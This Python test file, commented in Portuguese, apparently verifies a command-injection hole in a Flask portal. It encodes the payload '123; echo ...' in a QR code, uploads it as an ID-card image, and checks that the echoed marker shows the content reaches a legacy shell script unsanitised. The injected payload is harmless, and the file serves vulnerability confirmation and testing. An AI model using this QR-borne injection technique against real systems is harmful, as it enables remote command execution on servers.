"""Teste de camada 2: usa app.test_client() do Flask para validar a lógica de
upload + decodificação + repasse ao script legado, sem subir o container.

Precisa rodar com services/portal-publico no PYTHONPATH (ver sys.path abaixo)
e com o script legado presente no caminho relativo esperado por app.py, ou com
LEGACY_SCRIPT ajustado via monkeypatch.
"""

import io
import os
import sys

import qrcode

TESTS_DIR = os.path.dirname(os.path.abspath(__file__))
PORTAL_DIR = os.path.join(TESTS_DIR, "..", "services", "portal-publico")
sys.path.insert(0, PORTAL_DIR)

import app as portal_app  # noqa: E402  (import depende do sys.path acima)


def gerar_imagem_qrcode(conteudo):
    qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_M)
    qr.add_data(conteudo)
    qr.make(fit=True)
    imagem = qr.make_image(fill_color="black", back_color="white").convert("RGB")
    buffer = io.BytesIO()
    imagem.save(buffer, format="PNG")
    buffer.seek(0)
    return buffer


def main():
    # O script legado existe no caminho absoluto /app/legacy/... dentro do
    # container; localmente apontamos para o caminho real do repositório.
    portal_app.LEGACY_SCRIPT = os.path.join(PORTAL_DIR, "legacy", "validar_matricula.sh")

    client = portal_app.app.test_client()

    marcador = "RU_TEST_CMD_INJECTION_OK"
    payload = f"123; echo {marcador}"
    imagem = gerar_imagem_qrcode(payload)

    resposta = client.post(
        "/upload",
        data={"carteirinha": (imagem, "carteirinha.png")},
        content_type="multipart/form-data",
    )

    corpo = resposta.get_data(as_text=True)

    assert resposta.status_code == 200, f"status inesperado: {resposta.status_code}"
    assert marcador in corpo, "saída do comando injetado não apareceu na resposta — injection não confirmada"

    print("[OK] /upload decodifica o QR e repassa o conteúdo sem sanitização ao script legado.")
    print(f"[OK] marcador '{marcador}' encontrado na saída do sistema legado — command injection confirmada na camada Flask.")


if __name__ == "__main__":
    main()
